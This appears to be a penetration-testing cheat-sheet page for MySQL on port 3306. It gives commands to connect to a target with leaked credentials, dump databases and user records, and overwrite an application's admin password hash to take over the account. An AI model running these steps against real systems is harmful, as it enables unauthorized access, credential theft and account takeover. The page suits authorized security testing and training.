---
title: 3306 - MySQL
type: service
tab: Services
ports: [3306]
service: MySQL
phases: [enumeration, looting, exploitation]
tools: [mysql]
inputs: [Username, Password]
outputs: [Databases, Tables, Credentials, Admin]
tags:
  - MySQL
  - Enumeration
  - Exploitation
  - CredentialDumping
---

# 3306 - MySQL

## Found / Do / Then

- Found: `3306/tcp open mysql`.
- Do: connect with discovered creds and enumerate databases/tables.
- Then: loot application secrets, password hashes, or writable admin records.

## Commands

### MySQL Access And Database Looting

#Username #Password #MySQL #Enumeration #CredentialDumping
Connect with leaked MySQL credentials, enumerate databases/tables, and review application user records.

1. Connect to MySQL with leaked credentials.

```sh
mysql -h <TARGET_IP> -u <DB_USER> -p --skip-ssl
```

2. Enumerate databases and application user records.

```sql
SHOW DATABASES;
USE <DB_NAME>;
SHOW TABLES;
SELECT * FROM <TABLE_NAME>;
SELECT * FROM <TABLE_NAME> WHERE login = 'admin'\G
```

### Reset Application Admin Password

#Username #Password #MySQL #Exploitation
If you can write to the application user table, replace the admin password hash with a known hash for your chosen password.

```sql
-- Confirm the target row before updating.
SELECT id, login, password FROM <TABLE_NAME> WHERE login = 'admin'\G

-- Replace with a known-good hash for the target application.
UPDATE <TABLE_NAME> SET password = '<NEW_PASSWORD_HASH>' WHERE login = 'admin';
```
